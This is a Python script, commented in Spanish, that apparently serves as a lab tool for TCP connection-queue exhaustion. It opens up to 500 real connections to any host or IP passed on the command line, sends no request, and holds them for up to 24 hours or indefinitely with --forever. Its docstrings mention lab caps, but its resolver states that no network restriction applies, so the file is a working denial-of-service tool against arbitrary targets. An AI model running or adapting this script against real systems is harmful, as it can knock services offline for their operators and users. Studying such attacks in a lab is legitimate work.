"""Agotamiento de la cola de conexiones TCP.

Abre conexiones reales y no pide nada: ocupa la tabla de conexiones y la cola de
aceptacion del destino. Con `--forever` se mantiene abierto hasta Ctrl+C.
No falsifica el origen ni usa sockets crudos, asi que la traza es atribuible.
"""

import argparse
import json
import select
import socket
import time

# Topes duros del laboratorio (por contenedor).
MAX_CONNECTIONS = 500    # cola TCP
MAX_DURATION = 86400     # segundos (24 h) cuando no es infinito


def parse_target(value: str, default_port: int | None = None) -> tuple[str, int]:
    """Acepta 'host', 'host:puerto' o 'esquema://host:puerto'."""
    raw = value.strip()
    if "://" in raw:
        from urllib.parse import urlparse

        parsed = urlparse(raw)
        host = parsed.hostname or ""
        port = parsed.port or default_port
    elif raw.count(":") == 1:
        host, _, raw_port = raw.partition(":")
        port = int(raw_port) if raw_port.isdigit() else default_port
    else:
        host, port = raw, default_port

    if not host:
        raise ValueError(f"destino invalido: '{value}'")
    if port is None:
        raise ValueError("falta el puerto: usa --port o 'host:puerto'")
    if not 1 <= port <= 65535:
        raise ValueError(f"puerto fuera de rango: {port}")
    return host, port


def resolve(host: str, port: int) -> str:
    """Resuelve `host` a una dirección IP utilizable, sin restricción de red."""
    try:
        infos = socket.getaddrinfo(host, port, proto=socket.IPPROTO_TCP)
    except socket.gaierror as exc:
        raise ValueError(f"no se pudo resolver '{host}': {exc}") from exc

    for info in infos:
        if info[4][0]:
            return info[4][0]
    raise ValueError(f"'{host}' no tiene direcciones utilizables")


def clamp(name: str, value: float, maximum: float) -> float:
    """Recorta un parámetro al tope duro e informa cuando lo hace."""
    if value <= 0:
        raise ValueError(f"{name} debe ser > 0 (recibido {value})")
    if value > maximum:
        print(f"[limite] {name}={value} excede el tope del lab, se usa {maximum}")
        return maximum
    return value


def peer_closed(sock: socket.socket) -> bool:
    """Indica si el otro extremo cerro o reseteo la conexion."""
    readable, _, _ = select.select([sock], [], [], 0)
    if not readable:
        return False
    try:
        # MSG_PEEK no consume: solo mira si llego FIN o RST.
        return sock.recv(1, socket.MSG_PEEK) == b""
    except (ConnectionResetError, OSError):
        return True


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Agotamiento de cola TCP con conexiones reales (laboratorio)"
    )
    parser.add_argument("--dns", required=True, help="nombre DNS o IP del destino")
    parser.add_argument("--port", type=int, default=None, help="puerto del destino (def. 80)")
    parser.add_argument("--connections", type=int, default=200, help="conexiones a abrir")
    parser.add_argument("--duration", type=float, default=30.0, help="segundos")
    parser.add_argument("--forever", action="store_true", help="no termina hasta Ctrl+C")
    args = parser.parse_args()

    if args.port is None:
        args.port = 80

    try:
        host, port = parse_target(args.dns, args.port)
        ip = resolve(host, port)
    except ValueError as exc:
        print(f"[abortado] {exc}")
        raise SystemExit(2)

    wanted = int(clamp("connections", args.connections, MAX_CONNECTIONS))
    if not args.forever:
        args.duration = clamp("duration", args.duration, MAX_DURATION)

    print("=" * 66)
    print(f"  DESTINO   : {host}:{port}  ->  {ip}")
    print(f"  PATRON    : {wanted} conexiones abiertas sin completar peticion")
    print(f"  MODO      : {'INFINITO (Ctrl+C para parar)' if args.forever else f'{args.duration:g}s'}")
    print("=" * 66, flush=True)

    opened: list[socket.socket] = []
    failures = 0
    for _ in range(wanted):
        try:
            sock = socket.create_connection((ip, port), timeout=2)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            opened.append(sock)
        except OSError:
            failures += 1
            if failures >= 20 and not opened:
                print("  el destino no acepta conexiones")
                break

    print(f"  abiertas {len(opened)} · fallidas al conectar {failures}", flush=True)

    # Distingue las que el destino cerro nada mas aceptarlas.
    time.sleep(0.5)
    closed = [sock for sock in opened if peer_closed(sock)]
    for sock in closed:
        try:
            sock.close()
        except OSError:
            pass
    opened = [sock for sock in opened if sock not in closed]
    if closed:
        print(f"  el destino cerro {len(closed)} conexiones al aceptarlas", flush=True)

    open_count = len(opened)
    deadline = None if args.forever else time.perf_counter() + args.duration
    died_midway = 0
    try:
        while opened and (deadline is None or time.perf_counter() < deadline):
            time.sleep(1)
            still = [sock for sock in opened if not peer_closed(sock)]
            died_midway += len(opened) - len(still)
            opened = still
            print(f"  mantenidas {len(opened)} conexiones", flush=True)
    except KeyboardInterrupt:
        print("\n  detenido por el usuario")
    finally:
        for sock in opened:
            try:
                sock.close()
            except OSError:
                pass
        print(
            f"  resumen: {open_count} abiertas · {len(closed) + died_midway} cerradas por el destino",
            flush=True,
        )
        print(
            "RESULT:"
            + json.dumps(
                {
                    "kind": "conn",
                    "opened": open_count,
                    "closed_by_peer": len(closed) + died_midway,
                    "connect_failures": failures,
                },
                sort_keys=True,
            ),
            flush=True,
        )


if __name__ == "__main__":
    main()
